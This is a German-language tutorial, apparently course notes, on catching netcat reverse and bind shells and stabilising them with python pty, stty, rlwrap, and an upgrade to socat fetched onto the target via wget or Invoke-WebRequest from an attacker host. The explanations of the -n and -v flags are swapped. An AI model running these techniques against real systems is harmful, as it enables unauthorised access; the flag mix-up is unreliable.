Netcat ist das traditionelle „Schweizer Taschenmesser“ der Netzwerktechnik. Es wird verwendet, um alle Arten von Netzwerkinteraktionen manuell auszuführen, einschließlich Dinge wie das Abgreifen von Bannern während der Enumeration/Bestandaufnahme des Ziels, aber noch wichtiger für unsere Zwecke ist, dass es verwendet werden kann, um Reverse-Shells zu empfangen und sich mit entfernten Ports zu verbinden, die mit Bind-Shells auf einem Zielsystem verbunden sind. Netcat-Shells sind standardmäßig sehr instabil (leicht zu verlieren), können aber durch Techniken verbessert werden.

# Basic Reverse/Bind Shell

Basic Reverse Shell Syntax mit Erklärung
```
nc -lvnp <portnummer>
```

nc -> Startet NetCat
-l  -> Stellt NetCat in den Listener Mode
-n -> Sorg für einen Verbose output
-v ->  weist netcat an, keine Hostnamen aufzulösen oder DNS zu verwenden
-p -> Indiziert das Netcat auf einem Port der folgt lauschen soll


Basic Bind Shell Syntax
```
nc <Ziel-IP> <Ausgewählter Port>
```


# Stabilisierung der Netcat Shell

### Technik 1: Python

Die erste Technik, ist nur auf Linux-Systemen anwendbar, da auf diesen fast immer Python standardmäßig installiert ist. Dies ist ein dreistufiger Prozess:

Als Erstes verwenden wir den Befehl `python -c ‚'import pty;pty.spawn(„/bin/bash“)'` der Python verwendet, um eine besser ausgestattete Bash-Shell zu erzeugen; dabei ist zu beachten, dass einige Ziele die angegebene Python-Version benötigen. Wenn dies der Fall ist, muss python je nach Bedarf durch python2 oder python3 ersetzt werden. Jetzt sieht unsere Shell etwas hübscher aus, aber wir können immer noch nicht die Tabulator-Autovervollständigung oder die Pfeiltasten benutzen, und Strg + C beendet die Shell immer noch.

Der zweite Schritt ist: `export TERM=xterm` -- damit haben wir Zugriff auf term-Befehle wie `clear`.

Schließlich (und am wichtigsten) werden wir die Shell mit Strg + Z in den Hintergrund stellen. Zurück in unserem eigenen Terminal verwenden wir `stty raw -echo; fg.` Dies bewirkt zweierlei: Erstens schaltet es unser eigenes Terminal-Echo aus (wodurch wir Zugriff auf die automatische Vervollständigung von Tabulatoren, die Pfeiltasten und Strg + C zum Beenden von Prozessen erhalten). Dann bringt es die Shell in den Vordergrund und beendet den Prozess.

Bebildertes Besipiel:
https://imgur.com/KL79nHJ
### Technik 2: rlwrap

rlwrap ist ein Programm, das, einfach ausgedrückt, den Zugriff auf den Verlauf, die automatische Vervollständigung der Tabulatoren und die Pfeiltasten ermöglicht, sobald man eine Shell erhält. Allerdings muss man sich noch manuell stabilisieren, wenn man in der Lage sein will, Strg + C in der Shell zu verwenden. rlwrap ist unter Kali nicht standardmäßig installiert, also installieren Sie es zuerst mit `sudo apt install rlwrap`.

Um rlwrap zu verwenden, muss ein etwas anderer Listener aufgerufen werden:

```
rlwrap nc -lvnp <Port>
```

Indem wir unserem netcat-Listener „rlwrap“ voranstellen, erhalten wir eine viel besser ausgestattete Shell. Diese Technik ist besonders nützlich, wenn man mit Windows-Shells zu tun hat, die ansonsten bekanntermaßen schwer zu stabilisieren sind. Bei einem Linux-Ziel ist es möglich, die Shell vollständig zu stabilisieren, indem Sie denselben Trick wie in Schritt drei der vorherigen Technik anwenden: Verlassen Sie die Shell mit Strg + Z, verwenden Sie dann stty raw -echo; fg, um die Shell zu stabilisieren und erneut zu starten.

### Technik 3: Socat

Die dritte einfache Möglichkeit, eine Shell zu stabilisieren, besteht darin, eine anfängliche netcat-Shell als Sprungbrett für eine voll ausgestattete socat-Shell zu verwenden. Diese Technik ist allerdings auf Linux-Ziele beschränkt, da eine Socat-Shell unter Windows nicht stabiler ist als eine netcat-Shell. Um diese Methode der Stabilisierung zu erreichen, würden wir zunächst eine statisch kompilierte Socat-Binärdatei (eine Version des Programms, die so kompiliert wurde, dass sie keine Abhängigkeiten hat) auf den Zielrechner übertragen. Ein typischer Weg, dies zu erreichen, wäre die Verwendung eines Webservers auf dem angreifenden Rechner innerhalb des Verzeichnisses, das Ihre socat-Binärdatei enthält (sudo python3 -m http.server 80), und dann, auf dem Zielrechner, die Verwendung der netcat-Shell, um die Datei herunterzuladen. Unter Linux würde dies mit curl oder wget geschehen 

```
wget <LOCAL-IP>/socat -O /tmp/socat
```


Der Vollständigkeit halber: In einer Windows-CLI-Umgebung kann dasselbe mit Powershell durchgeführt werden, indem entweder Invoke-WebRequest oder eine Webrequest-Systemklasse verwendet wird, je nach installierter Powershell-Version . Wir werden die Syntax für das Senden und Empfangen von Shells mit Socat in den kommenden Aufgaben behandeln.

```
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```
oder
```
iwr -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

#### GENAUERES IN EINTRAG SOCAT
